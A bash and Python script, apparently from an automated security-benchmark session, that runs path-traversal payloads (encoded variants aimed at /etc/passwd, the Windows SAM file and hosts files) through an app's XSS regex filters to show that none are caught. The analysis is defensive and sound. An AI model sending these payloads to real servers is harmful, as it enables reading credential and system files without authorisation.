#!/bin/bash
# POC: Analyzes the regex filters applied by the /xss11 endpoint to demonstrate that path traversal payloads bypass validation because filters are XSS-specific and don't check for path traversal characters/syntax
# Target: ./repo
# Created: 2025-11-05T17:19:45.404Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# Path Traversal - Regex Filter Analysis POC
# Analyzes the regex filters to demonstrate why path traversal payloads bypass validation

echo "=========================================="
echo "Path Traversal - Regex Filter Analysis"
echo "=========================================="
echo

# The application uses two regex filters:
# Filter 1: r"""[\"']XSS[\"']"""  - Removes quoted "XSS" strings
# Filter 2: r"""<[a-z/]"""        - Removes HTML tags with lowercase letters

echo "Analyzing regex filters:"
echo "========================"
echo
echo "Filter 1: [\"']XSS[\"']"
echo "  Purpose: Remove quoted 'XSS' strings"
echo "  Scope: Only matches the literal string 'XSS' in quotes"
echo "  Path traversal coverage: NONE"
echo
echo "Filter 2: <[a-z/]"
echo "  Purpose: Remove HTML tags with lowercase letters"
echo "  Scope: Only matches '<' followed by lowercase a-z or forward slash"
echo "  Path traversal coverage: NONE"
echo
echo "=========================================="
echo

# Simulate the regex filtering in Python
python3 << 'EOF'
import re

# Application's regex filters
filter1 = r"""[\"']XSS[\"']"""
filter2 = r"""<[a-z/]"""

# Path traversal payloads to test
payloads = [
    "../../../etc/passwd",
    "../../windows/system32/config/sam",
    "/etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "...//...//...//etc/passwd",
    "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "\\\\server\\share\\file",
]

print("Testing Path Traversal Payloads Against Filters:")
print("=" * 50)
print()

bypassed = 0
for payload in payloads:
    # Apply filters
    after_filter1 = re.sub(filter1, "", payload)
    after_filter2 = re.sub(filter2, "", after_filter1)
    
    # Check if payload was modified
    if after_filter2 == payload:
        print(f"✗ BYPASSED: {payload}")
        print(f"  Reason: No filter patterns matched this payload")
        bypassed += 1
    else:
        print(f"✓ FILTERED: {payload}")
        print(f"  After filters: {after_filter2}")
    print()

print("=" * 50)
print(f"Summary: {bypassed}/{len(payloads)} payloads bypassed the filters")
print()

if bypassed > 0:
    print("CONCLUSION: Path traversal payloads bypass the XSS-focused regex filters")
    print("because the filters only check for XSS and HTML patterns, not path traversal syntax.")
    exit(0)
else:
    print("No payloads bypassed - filters may be more effective than expected")
    exit(1)
EOF

exit $?